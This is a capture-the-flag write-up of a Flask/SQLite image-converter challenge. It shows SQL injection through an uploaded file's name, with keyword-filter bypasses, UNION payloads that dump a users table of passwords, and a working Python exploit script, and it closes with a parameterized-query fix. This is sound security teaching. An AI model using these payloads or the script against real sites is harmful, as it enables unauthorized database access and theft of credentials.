# Black-Box-PacketCapture-CTF-Writeup[README(2).md](https://github.com/user-attachments/files/33923889/README.2.md)
# 🗃️ Black Box — PacketCapture CTF Writeup

> **One of the software developers had a hobby project. Confined within the black box, the way inside is not what you seem.**

| | |
|---|---|
| **Event** | PacketCapture CTF |
| **Act** | 02 |
| **Challenge** | Black Box |
| **Category** | Web Exploitation |
| **Difficulty** | Medium |
| **Points** | 125 base pts |
| **Target** | `https://blackbox.challs.packetcapture.xyz` |
| **Flag** | `PacketCapture{1nj3ct_m3_8decaf00}` |

---

## 📌 TL;DR

The target is **AsciiFX**, an image-to-ASCII converter. The obvious attack surface — uploading a malicious *file* — is a decoy. The real vulnerability is **SQL injection through the filename**: the app interpolates `file.filename` directly into a SQLite query. By bypassing its filters (no spaces, blacklisted SQL keywords, image-extension check) and abusing the fact that the *"file already exists"* error **echoes back the returned database row**, I used a `UNION SELECT` to dump a hidden `users` table — where the admin's password *is* the flag.

---

## 1. Recon

Visiting the target shows a single page:

- **AsciiFX** — "Text to Ascii arts!"
- A file upload form: *"Only .jpg, .jpeg, and .png allowed. No null bytes."*
- Footer: *"Developed using Flask and SQLite... :)"* ← the stack is name-dropped for a reason
- Server header: `gunicorn`

Only two routes exist:

- `GET/POST /` — the upload form
- `GET /files/<id>` — view a converted image

Uploading a normal `test.png` returns:

```
[+] SUCCESS: File uploaded & converted! Available at /files/364be8860e8d72b4358b5e88099a935a
```

That ID is just the MD5 of the filename:

```bash
$ echo -n "test.png" | md5sum
364be8860e8d72b4358b5e88099a935a
```

So the app tracks uploads in its SQLite database keyed by filename — a hint about where the filename ends up.

---

## 2. Finding the Injection Point

Uploading the same filename twice gives:

```
[!] SYSTEM ALERT: ERROR: File 'test.png' already exists
```

This means the app first checks whether the filename is already in the DB. Out of curiosity, I uploaded a file with a **single quote** in the name:

```
a'x.png
```

```
[!] SYSTEM ALERT: SQL Error: near "x": syntax error
```

💥 **SQL injection via the filename**, and the backend even leaks raw SQLite error messages. The vulnerable query is evidently something like:

```python
cursor.execute(f"SELECT original_name FROM files WHERE original_name = '{filename}'")
```

A boolean test confirms it actually evaluates my logic:

| Filename | Result | Meaning |
|---|---|---|
| `x'OR'1.png'='1.png` | "File ... already exists" | `WHERE` evaluated **TRUE** — a row was returned |
| `x'OR'1.png'='2.png` | Upload succeeds | `WHERE` evaluated **FALSE** — no row returned |

Interesting bonus: in the TRUE case, the error prints the `original_name` **of the row returned by the query**, not my input. Whatever row my query returns gets reflected in the page — a perfect exfiltration channel for a `UNION`-based attack.

---

## 3. Bypassing the Filters

The app does try to defend itself. Probing revealed four filters — all bypassable:

| Filter | Error message | Bypass |
|---|---|---|
| Spaces in filename | `Security Alert: Spaces are not allowed in file names` | Use `/**/` in place of spaces (SQL comments count as whitespace) |
| Null bytes (`\x00` / `%00`) | `Security Alert: Null bytes detected.` | Not needed for this attack at all — part of the decoy |
| Blacklisted keywords: `union`, `select`, `from`, `where` (and their `UPPERCASE` forms) | `Security Alert: SQL injection detected` | **Mixed case** — `UnIoN`, `SeLeCt`, `FrOm`, `WhErE`. SQLite keywords are case-insensitive, but the blacklist isn't |
| Filename must end in `.jpg` / `.jpeg` / `.png` | `Invalid file type. Allowed: .jpg, .jpeg, .png` | End payloads with `--.png` — the `--` comments out the trailing quote in the query, and the name still ends in `.png` |

---

## 4. Determining the Column Count

For `UNION SELECT` I need to match the original query's column count. Testing with marker strings:

```
zzznonexist12345'/**/UnIoN/**/SeLeCt/**/'COL0'--.png
→ ERROR: File 'COL0' already exists          ✅ 1 column works

zzznonexist12345'/**/UnIoN/**/SeLeCt/**/'COL0','COL1'--.png
→ SQL Error: SELECTs to the left and right of UNION do not have
  the same number of result columns         ❌ 2 columns fails
```

The original query selects exactly **1 column** (the `original_name`, as guessed) — and the response `File 'COL0' already exists` proves my injected row is printed verbatim. From here I can make the app print **any single value** from the database.

---

## 5. Enumerating the Schema

`group_concat()` squeezes the whole schema into one printable value:

```
zzznonexist9'/**/UnIoN/**/SeLeCt/**/group_concat(sql,'~~~')/**/FrOm/**/sqlite_master--.png
```

```sql
CREATE TABLE files (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    original_name TEXT NOT NULL,
    file_hash TEXT NOT NULL
)
~~~
CREATE TABLE sqlite_sequence(name,seq)
~~~
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT NOT NULL,
    password TEXT NOT NULL
)
```

There's a hidden **`users`** table that the web app never exposes. 🎯

---

## 6. Dumping the Flag

```
zzznonexist9'/**/UnIoN/**/SeLeCt/**/group_concat(username||':'||password,'~~~')/**/FrOm/**/users--.png
```

Response:

```
ERROR: File 'admin:PacketCapture{1nj3ct_m3_8decaf00}~~~guest:guest123' already exists
```

The admin's password is the flag. Verified directly:

```
zzznonexist9'/**/UnIoN/**/SeLeCt/**/password/**/FrOm/**/users/**/WhErE/**/username='admin'--.png
→ ERROR: File 'PacketCapture{1nj3ct_m3_8decaf00}' already exists
```

---

## 7. Exploit Script

[`exploit.py`](./exploit.py):

```python
#!/usr/bin/env python3
"""Black Box (PacketCapture CTF) — SQL injection via filename.

The upload handler interpolates the filename into:
    SELECT original_name FROM files WHERE original_name = '<filename>'
and prints the returned row in its "already exists" error, so a
UNION SELECT prints arbitrary database values.

Bypasses:
  - spaces banned              -> /**/
  - union/select/from/where
    banned (lower + UPPER)     -> mixed case (SQLite is case-insensitive)
  - must end in .png           -> trailing --.png comments out the last quote
"""
import html
import io
import re

import requests

URL = "https://blackbox.challs.packetcapture.xyz/"


def query(expr: str) -> str:
    """Run `SELECT <expr>` via UNION injection and return the leaked value."""
    payload = f"zzznonexist9'/**/UnIoN/**/SeLeCt/**/{expr}--.png"
    files = {"file": (payload, io.BytesIO(b"x"), "image/png")}
    r = requests.post(URL, files=files, timeout=15)
    text = html.unescape(re.sub(r"<[^>]+>", " ", r.text))
    text = " ".join(text.split())
    m = re.search(r"File '(.*)' already exists", text)
    if m:
        return m.group(1)
    m = re.search(r"(SQL Error: .*?|Security Alert: .*?)(?: Developed|$)", text)
    return f"[-] {m.group(1) if m else text[-200:]}"


if __name__ == "__main__":
    print("[*] Tables :", query("group_concat(name,',')/**/FrOm/**/sqlite_master"))
    print("[*] Users  :", query("group_concat(username||':'||password,'|')/**/FrOm/**/users"))
    flag = query("password/**/FrOm/**/users/**/WhErE/**/username='admin'")
    print(f"[+] Flag   : {flag}")
```

Output:

```
[*] Tables : files,sqlite_sequence,users
[*] Users  : admin:PacketCapture{1nj3ct_m3_8decaf00}|guest:guest123
[+] Flag   : PacketCapture{1nj3ct_m3_8decaf00}
```

---

## 🏁 Flag

```
PacketCapture{1nj3ct_m3_8decaf00}
```

---

## 💡 Takeaways

- **The attack surface is not always what it seems.** Everything about this challenge ("No null bytes", strict extension whitelist) nudges you toward file-upload RCE — but the file *contents* were never even validated. The dangerous input was the filename.
- **Metadata is user input too.** Filenames, headers, and other "harmless" fields end up in queries, file paths, and logs. They deserve the same scrutiny as form fields.
- **Blacklists make poor defenses.** Blocking `select`/`SELECT` but not `SeLeCt`, and banning spaces but not `/**/`, delayed the exploit by minutes at most.
- **Error messages are an exfiltration channel.** Reflecting the matched database row in the "already exists" error turned a blind injection into a direct data dump — no need for slow character-by-character boolean extraction.

### The fix

```python
# ❌ Vulnerable — string interpolation, blacklist filters
cursor.execute(f"SELECT original_name FROM files WHERE original_name = '{filename}'")

# ✅ Safe — parameterized query
cursor.execute("SELECT original_name FROM files WHERE original_name = ?", (filename,))
```

Parameterized queries, generic error messages (log the details server-side instead), and least-privilege DB access (the upload handler had no business reading the `users` table) would have closed this hole completely.
